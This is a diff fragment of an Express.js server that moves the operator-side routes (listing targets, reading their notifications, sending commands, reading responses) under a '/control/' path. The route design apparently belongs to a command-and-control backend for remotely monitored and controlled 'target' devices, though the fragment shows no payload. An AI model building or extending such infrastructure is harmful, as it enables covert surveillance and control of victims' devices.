@@ -64,7 +64,7 @@ router.post('/api/register-target', (req, res) => {
 });
 
 // List targets
-router.get('/api/list-targets', (req, res) => {
+router.get('/control/api/list-targets', (req, res) => {
     const targets = readData(TARGETS_FILE);
     res.json(targets);
 });
@@ -85,14 +85,14 @@ router.post('/api/post-notification/:id', (req, res) => {
 });
 
 // Get notifications
-router.get('/api/get-notifications/:id', (req, res) => {
+router.get('/control/api/get-notifications/:id', (req, res) => {
     const allNotifs = readData(NOTIF_FILE);
     const filtered = allNotifs.filter(n => n.targetId === req.params.id);
     res.json(filtered);
 });
 
 // Send command
-router.post('/api/send-command', (req, res) => {
+router.post('/control/api/send-command', (req, res) => {
     const { id, command, extra } = req.body;
     let commands = readData(COMMANDS_FILE);
     commands = commands.filter(c => c.targetId !== id);
@@ -136,7 +136,7 @@ router.post('/api/post-response/:id', (req, res) => {
 });
 
 // Get response
-router.get('/api/get-response/:id', (req, res) => {
+router.get('/control/api/get-response/:id', (req, res) => {
     const responses = readData(RESPONSES_FILE);
     const resData = responses.find(r => r.targetId === req.params.id);
     res.json(resData || {});
